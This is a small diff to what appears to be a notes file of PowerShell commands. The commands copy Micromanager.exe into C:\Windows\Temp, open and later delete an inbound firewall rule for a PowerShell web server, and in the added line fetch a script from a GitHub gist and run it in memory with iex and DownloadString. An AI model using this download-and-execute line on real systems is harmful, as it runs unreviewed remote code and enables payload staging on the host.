@@ -44,13 +44,15 @@ Get-ChildItem -Force  C:\Users\TestUser\AppData\Local\Micromanager\
   copy 'C:\Users\Public\Micromanager.exe' 'C:\Windows\Temp\'   
 
 
-netsh advfirewall firewall add rule name="Powershell Webserver" dir=in action=allow protocol=TCP localport=8080
+netsh advfirewall firewall add rule name="Powershell Webserver" dir=in action=allow protocol=TCP localport=4000
 install-module webserver
 import-module webserver
 start-webserver
 
 
 netsh advfirewall firewall delete rule name="Powershell Webserver"
+
+iex (New-Object Net.WebClient).DownloadString("https://gist.githubusercontent.com/osvaldohdzm/0b683991541a642133ff2c9e93adfa75/raw/ec9a42ff40f7b7c27f3a2d8130ebad5c9441c729/power-http-server.ps1")
 
 ```
 
